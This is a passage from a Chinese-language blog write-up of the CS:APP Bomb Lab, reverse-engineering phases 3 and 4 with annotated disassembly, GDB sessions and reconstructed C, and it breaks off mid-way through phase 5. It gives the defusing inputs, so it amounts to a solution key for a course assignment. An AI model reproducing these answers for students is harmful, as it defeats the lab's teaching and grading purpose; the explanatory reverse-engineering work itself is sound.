<h4 id="阶段3-phase-3"><a href="#阶段3-phase-3" class="headerlink" title="阶段3 - phase_3"></a>阶段3 - phase_3</h4><p>在bomb-disassemble中观察phase_3的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line">  400f47:       <span class="number">48</span> <span class="number">8d</span> 4c <span class="number">24</span> 0c          <span class="keyword">lea</span>    <span class="number">0xc</span>(%rsp),%rcx</span><br><span class="line">  400f4c:       <span class="number">48</span> <span class="number">8d</span> <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>          <span class="keyword">lea</span>    <span class="number">0x8</span>(%rsp),%rdx</span><br><span class="line">  400f51:       be cf <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4025cf,%esi</span><br><span class="line">  400f56:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  400f5b:       e8 <span class="number">90</span> fc ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  # 从输入的字符串中读取两个数字 并存入局部变量中</span><br><span class="line">  400f60:       <span class="number">83</span> f8 <span class="number">01</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line">  400f63:       7f <span class="number">05</span>                   <span class="keyword">jg</span>     400f6a &lt;phase_3+<span class="number">0x27</span>&gt;</span><br><span class="line">  400f65:       e8 d0 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt; # 若读取成功的数字不足两个 则引爆bomb</span><br><span class="line">  400f6a:       <span class="number">83</span> 7c <span class="number">24</span> <span class="number">08</span> <span class="number">07</span>          cmpl   <span class="number">$0</span>x7,<span class="number">0x8</span>(%rsp)</span><br><span class="line">  400f6f:       <span class="number">77</span> 3c                   <span class="keyword">ja</span>     400fad &lt;phase_3+<span class="number">0x6a</span>&gt; # 若第一个数字（无符号）大于<span class="number">7</span> 则引爆bomb</span><br><span class="line">  400f71:       8b <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rsp),%eax</span><br><span class="line">  400f75:       ff <span class="number">24</span> c5 <span class="number">70</span> <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>    jmpq   *<span class="number">0x402470</span>(,%rax,<span class="number">8</span>)</span><br><span class="line">  400f7c:       b8 cf <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>xcf,%eax</span><br><span class="line">  400f81:       eb 3b                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400f83:       b8 c3 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x2c3,%eax</span><br><span class="line">  400f88:       eb <span class="number">34</span>                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400f8a:       b8 <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x100,%eax</span><br><span class="line">  400f8f:       eb <span class="number">2d</span>                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400f91:       b8 <span class="number">85</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x185,%eax</span><br><span class="line">  400f96:       eb <span class="number">26</span>                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400f98:       b8 ce <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>xce,%eax</span><br><span class="line">  400f9d:       eb 1f                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400f9f:       b8 aa <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x2aa,%eax</span><br><span class="line">  400fa4:       eb <span class="number">18</span>                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400fa6:       b8 <span class="number">47</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x147,%eax</span><br><span class="line">  400fab:       eb <span class="number">11</span>                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400fad:       e8 <span class="number">88</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  400fb7:       eb <span class="number">05</span>                   <span class="keyword">jmp</span>    400fbe &lt;phase_3+<span class="number">0x7b</span>&gt;</span><br><span class="line">  400fb9:       b8 <span class="number">37</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x137,%eax # switch语句</span><br><span class="line">  400fbe:       3b <span class="number">44</span> <span class="number">24</span> 0c             <span class="keyword">cmp</span>    <span class="number">0xc</span>(%rsp),%eax</span><br><span class="line">  400fc2:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     400fc9 &lt;phase_3+<span class="number">0x86</span>&gt; # 判断a和b是否相等 不想等则引爆炸弹</span><br><span class="line">  400fc4:       e8 <span class="number">71</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>             <span class="keyword">add</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line">  400fcd:       c3                      retq</span><br></pre></td></tr></table></figure><br>推测phase_3的一开始用sscanf从输入字符串中读入了2个int型数字。</p>
<p>然后观察phase_3中的jmpq ×0x402470(,%rax,8)以及下面的mov与jmp指令，基本上可以肯定这是使用跳转表实现的switch语句。</p>
<p>下面在GDB中验证并记录不同%rax的值对应跳转表的不同跳转位置。具体的命令及结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">break</span> explode_bomb</span><br><span class="line">Breakpoint 1 at 0x40143a</span><br><span class="line">(gdb) <span class="built_in">break</span> phase_3</span><br><span class="line">Breakpoint 2 at 0x400f43</span><br><span class="line">(gdb) run test.txt</span><br><span class="line">Starting program: /home/blackdragon/CSAPPLabs/BombLab/bomb test.txt</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">That<span class="string">'s number 2.  Keep going!</span></span><br><span class="line"><span class="string">1 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Breakpoint 2, 0x0000000000400f43 in phase_3 ()</span></span><br><span class="line"><span class="string">(gdb) stepi 4</span></span><br><span class="line"><span class="string">0x0000000000400f56 in phase_3 ()</span></span><br><span class="line"><span class="string">(gdb) print (char *)($rsi)</span></span><br><span class="line"><span class="string">$1 = 0x4025cf "%d %d"</span></span><br><span class="line"><span class="string">(gdb) print /x *(long *)(0x402470+0)</span></span><br><span class="line"><span class="string">$2 = 0x400f7c</span></span><br><span class="line"><span class="string">(gdb) print /x *(long *)(0x402470+8)</span></span><br><span class="line"><span class="string">$3 = 0x400fb9</span></span><br><span class="line"><span class="string">(gdb) print /x *(long *)(0x402470+16)</span></span><br><span class="line"><span class="string">$4 = 0x400f83</span></span><br><span class="line"><span class="string">(gdb) print /x *(long *)(0x402470+24)</span></span><br><span class="line"><span class="string">$5 = 0x400f8a</span></span><br><span class="line"><span class="string">(gdb) print /x *(long *)(0x402470+32)</span></span><br><span class="line"><span class="string">$6 = 0x400f91</span></span><br><span class="line"><span class="string">(gdb) print /x *(long *)(0x402470+40)</span></span><br><span class="line"><span class="string">$7 = 0x400f98</span></span><br><span class="line"><span class="string">(gdb) print /x *(long *)(0x402470+48)</span></span><br><span class="line"><span class="string">$8 = 0x400f9f</span></span><br><span class="line"><span class="string">(gdb) print /x *(long *)(0x402470+56)</span></span><br><span class="line"><span class="string">$9 = 0x400fa6</span></span><br></pre></td></tr></table></figure><br>从GDB运行的结果可以看出，sscanf确实读入了两个int *数字，并且也得到了所有的%rax对应的跳转表的不同跳转位置。我们已经有了足够的信息来进行phase_3的逆向。</p>
<p>将phase_3函数逆向，得到如下的结果：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phase_3</span><span class="params">(<span class="keyword">char</span> * input)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a, b;</span><br><span class="line">	<span class="keyword">int</span> val = <span class="built_in">sscanf</span>(input, <span class="string">"%d %d"</span>, &amp;a, &amp;b);</span><br><span class="line">	<span class="keyword">if</span> (val &lt;= <span class="number">1</span>) explode_bomb();</span><br><span class="line">	<span class="keyword">switch</span> (a) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>: a = <span class="number">207</span>; <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>: a = <span class="number">311</span>; <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>: a = <span class="number">707</span>; <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">3</span>: a = <span class="number">256</span>; <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">4</span>: a = <span class="number">389</span>; <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">5</span>: a = <span class="number">206</span>; <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">6</span>: a = <span class="number">682</span>; <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">7</span>: a = <span class="number">327</span>; <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>: explode_bomb(); a = <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (a != b) explode_bomb();</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>根据逆向的结果，我们可以得知，本阶段要求输入2个数，且第1个数只能为0到7，且根据第1个数取值的不同，满足条件的第2个数的取值也不同，可能的答案如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">第1个数</th>
<th style="text-align:center">第2个数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">207</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">311</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">707</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">256</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">389</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">206</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">682</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">327</td>
</tr>
</tbody>
</table>
<p>在GDB中运行bomb并验证结果，结果正确。</p>
<h4 id="阶段4-phase-4"><a href="#阶段4-phase-4" class="headerlink" title="阶段4 - phase_4"></a>阶段4 - phase_4</h4><p>在bomb-disassemble中观察phase_4的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line">  <span class="number">401010</span>:       <span class="number">48</span> <span class="number">8d</span> 4c <span class="number">24</span> 0c          <span class="keyword">lea</span>    <span class="number">0xc</span>(%rsp),%rcx</span><br><span class="line">  <span class="number">401015</span>:       <span class="number">48</span> <span class="number">8d</span> <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>          <span class="keyword">lea</span>    <span class="number">0x8</span>(%rsp),%rdx</span><br><span class="line">  40101a:       be cf <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4025cf,%esi</span><br><span class="line">  40101f:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  <span class="number">401024</span>:       e8 c7 fb ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt; # 从输入的字符串中读取两个数字 并存入局部变量中</span><br><span class="line">  <span class="number">401029</span>:       <span class="number">83</span> f8 <span class="number">02</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x2,%eax</span><br><span class="line">  40102c:       <span class="number">75</span> <span class="number">07</span>                   <span class="keyword">jne</span>    <span class="number">401035</span> &lt;phase_4+<span class="number">0x29</span>&gt; # 若数字不为两个 则引爆bomb</span><br><span class="line">  40102e:       <span class="number">83</span> 7c <span class="number">24</span> <span class="number">08</span> 0e          cmpl   <span class="number">$0</span>xe,<span class="number">0x8</span>(%rsp)</span><br><span class="line">  <span class="number">401033</span>:       <span class="number">76</span> <span class="number">05</span>                   <span class="keyword">jbe</span>    40103a &lt;phase_4+<span class="number">0x2e</span>&gt; # 若第一个数字大于<span class="number">14</span> 则引爆bomb</span><br><span class="line">  <span class="number">401035</span>:       e8 <span class="number">00</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:       ba 0e <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>xe,%edx</span><br><span class="line">  40103f:       be <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%esi</span><br><span class="line">  <span class="number">401044</span>:       8b 7c <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rsp),%edi</span><br><span class="line">  <span class="number">401048</span>:       e8 <span class="number">81</span> ff ff ff          callq  400fce &lt;func4&gt; # 调用func4</span><br><span class="line">  <span class="number">40104d</span>:       <span class="number">85</span> c0                   <span class="keyword">test</span>   %eax,%eax</span><br><span class="line">  40104f:       <span class="number">75</span> <span class="number">07</span>                   <span class="keyword">jne</span>    <span class="number">401058</span> &lt;phase_4+<span class="number">0x4c</span>&gt;</span><br><span class="line">  <span class="number">401051</span>:       <span class="number">83</span> 7c <span class="number">24</span> 0c <span class="number">00</span>          cmpl   <span class="number">$0</span>x0,<span class="number">0xc</span>(%rsp)</span><br><span class="line">  <span class="number">401056</span>:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     <span class="number">40105d</span> &lt;phase_4+<span class="number">0x51</span>&gt; # 当返回值和b均为<span class="number">0</span>时 解除阶段 否则 引爆bomb</span><br><span class="line">  <span class="number">401058</span>:       e8 <span class="built_in">dd</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">40105d</span>:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>             <span class="keyword">add</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line">  <span class="number">401061</span>:       c3  </span><br></pre></td></tr></table></figure><br>可以注意到，phase_4的反汇编代码前半部分与phase_3相似，均是从输入的字符串中读入2个数字。</p>
<p>将phase_4逆向，得到如下的结果：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phase_4</span><span class="params">(<span class="keyword">char</span> * input)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a, b;</span><br><span class="line">	<span class="keyword">int</span> val = <span class="built_in">sscanf</span>(input, <span class="string">"%d %d"</span>, &amp;a, &amp;b);</span><br><span class="line">	<span class="keyword">if</span> (val != <span class="number">2</span> || ((<span class="keyword">unsigned</span>)a &gt; <span class="number">14</span>)) explode_bomb();</span><br><span class="line">	val = func4(a, <span class="number">0</span>, <span class="number">14</span>);</span><br><span class="line">	<span class="keyword">if</span> (val != <span class="number">0</span> || b != <span class="number">0</span>) explode_bomb();</span><br><span class="line">	<span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><br>从逆向的结果我们可以看出，phase_4从输入的字符串中读入2个数字a和b，并且a必须小于等于14且大于等于0，然后phase_4调用func4(a, 0, 14)，且只有该函数的返回值和b均为0时，该阶段解除。</p>
<p>现在我们将注意转向phase_4调用的func4函数，func4的反汇编代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line">  400fd2:       <span class="number">89</span> d0                   <span class="keyword">mov</span>    %edx,%eax</span><br><span class="line">  400fd4:       <span class="number">29</span> f0                   <span class="keyword">sub</span>    %esi,%eax</span><br><span class="line">  400fd6:       <span class="number">89</span> c1                   <span class="keyword">mov</span>    %eax,%ecx</span><br><span class="line">  400fd8:       c1 e9 1f                <span class="keyword">shr</span>    <span class="number">$0</span>x1f,%ecx</span><br><span class="line">  400fdb:       <span class="number">01</span> c8                   <span class="keyword">add</span>    %ecx,%eax</span><br><span class="line">  400fdd:       d1 f8                   <span class="keyword">sar</span>    %eax</span><br><span class="line">  # 实际上是/<span class="number">2</span>过程，为了保证负数时舍入正确才使用了位移</span><br><span class="line">  400fdf:       <span class="number">8d</span> 0c <span class="number">30</span>                <span class="keyword">lea</span>    (%rax,%rsi,<span class="number">1</span>),%ecx</span><br><span class="line">  # %rax加上b</span><br><span class="line">  400fe2:       <span class="number">39</span> f9                   <span class="keyword">cmp</span>    %edi,%ecx</span><br><span class="line">  400fe4:       7e 0c                   <span class="keyword">jle</span>    400ff2 &lt;func4+<span class="number">0x24</span>&gt;</span><br><span class="line">  # if分支</span><br><span class="line">  400fe6:       <span class="number">8d</span> <span class="number">51</span> ff                <span class="keyword">lea</span>    -<span class="number">0x1</span>(%rcx),%edx</span><br><span class="line">  400fe9:       e8 e0 ff ff ff          callq  400fce &lt;func4&gt;</span><br><span class="line">  # 递归过程</span><br><span class="line">  400fee:       <span class="number">01</span> c0                   <span class="keyword">add</span>    %eax,%eax</span><br><span class="line">  400ff0:       eb <span class="number">15</span>                   <span class="keyword">jmp</span>    <span class="number">401007</span> &lt;func4+<span class="number">0x39</span>&gt;</span><br><span class="line">  400ff2:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  400ff7:       <span class="number">39</span> f9                   <span class="keyword">cmp</span>    %edi,%ecx</span><br><span class="line">  400ff9:       <span class="number">7d</span> 0c                   <span class="keyword">jge</span>    <span class="number">401007</span> &lt;func4+<span class="number">0x39</span>&gt;</span><br><span class="line">  400ffb:       <span class="number">8d</span> <span class="number">71</span> <span class="number">01</span>                <span class="keyword">lea</span>    <span class="number">0x1</span>(%rcx),%esi</span><br><span class="line">  400ffe:       e8 cb ff ff ff          callq  400fce &lt;func4&gt;</span><br><span class="line">  # 递归过程</span><br><span class="line">  <span class="number">401003</span>:       <span class="number">8d</span> <span class="number">44</span> <span class="number">00</span> <span class="number">01</span>             <span class="keyword">lea</span>    <span class="number">0x1</span>(%rax,%rax,<span class="number">1</span>),%eax</span><br><span class="line">  <span class="number">401007</span>:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>             <span class="keyword">add</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line">  40100b:       c3                      retq   </span><br></pre></td></tr></table></figure><br>观察反汇编的func4函数，发现func4函数中调用了func4函数自身，由此可以推测func4函数是一个递归过程。</p>
<p>将func4逆向，得到如下的结果：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> returnVal = (c - b) / <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">int</span> val = returnVal + b;</span><br><span class="line">	<span class="keyword">if</span> (val == a) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (val &lt; a) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">2</span> * func4(a, val + <span class="number">1</span>, c) + <span class="number">1</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">2</span> * func4(a, b, val - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>观察func4的逆向结果，我们可以发现func4非常类似于二分查找的过程。要另func4的返回值为0，则一定不能让func4执行val&lt;a的分支即必须一直保证(b+c)/2 &gt;= a。考虑到0&lt;=a&lt;=14，所以满足条件的a有a=7 a=3 a=1 a=0 共4个。</p>
<p>在GDB中运行bomb并验证结果，结果正确。</p>
<h4 id="阶段5-phase-5"><a href="#阶段5-phase-5" class="headerlink" title="阶段5 - phase_5"></a>阶段5 - phase_5</h4><p>在bomb-disassemble中观察phase_5的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000401062</span> &lt;phase_5&gt;:</span><br><span class="line">  <span class="number">401062</span>:       <span class="number">53</span>                      <span class="keyword">push</span>   %rbx</span><br><span class="line">  <span class="number">401063</span>:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">20</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x20,%rsp</span><br><span class="line">  <span class="number">401067</span>:       <span class="number">48</span> <span class="number">89</span> fb                <span class="keyword">mov</span>    %rdi,%rbx</span><br><span class="line">  40106a:       <span class="number">64</span> <span class="number">48</span> 8b <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span>    <span class="keyword">mov</span>    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  <span class="number">401071</span>:       <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  # 栈破坏检测机制</span><br><span class="line">  <span class="number">401073</span>:       <span class="number">48</span> <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">18</span>          <span class="keyword">mov</span>    %rax,<span class="number">0x18</span>(%rsp)</span><br><span class="line">  <span class="number">401078</span>:       <span class="number">31</span> c0                   <span class="keyword">xor</span>    %eax,%eax</span><br><span class="line">  40107a:       e8 9c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          callq  40131b &lt;string_length&gt;</span><br><span class="line">  # 计算输入字符串长度</span><br><span class="line">  40107f:       <span class="number">83</span> f8 <span class="number">06</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x6,%eax</span><br><span class="line">  <span class="number">401082</span>:       <span class="number">74</span> 4e                   <span class="keyword">je</span>     4010d2 &lt;phase_5+<span class="number">0x70</span>&gt;</span><br><span class="line">  # 若长度不为<span class="number">6</span> 则引爆bomb</span><br><span class="line">  <span class="number">401084</span>:       e8 b1 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">401089</span>:       eb <span class="number">47</span>                   <span class="keyword">jmp</span>    4010d2 &lt;phase_5+<span class="number">0x70</span>&gt;</span><br><span class="line">  40108b:       0f b6 0c <span class="number">03</span>             movzbl (%rbx,%rax,<span class="number">1</span>),%ecx</span><br><span class="line">  40108f:       <span class="number">88</span> 0c <span class="number">24</span>                <span class="keyword">mov</span>    %cl,(%rsp)</span><br><span class="line">  <span class="number">401092</span>:       <span class="number">48</span> 8b <span class="number">14</span> <span class="number">24</span>             <span class="keyword">mov</span>    (%rsp),%rdx</span><br><span class="line">  <span class="number">401096</span>:       <span class="number">83</span> e2 0f                <span class="keyword">and</span>    <span class="number">$0</span>xf,%edx</span><br><span class="line">  <span class="number">401099</span>:       0f b6 <span class="number">92</span> b0 <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>    movzbl 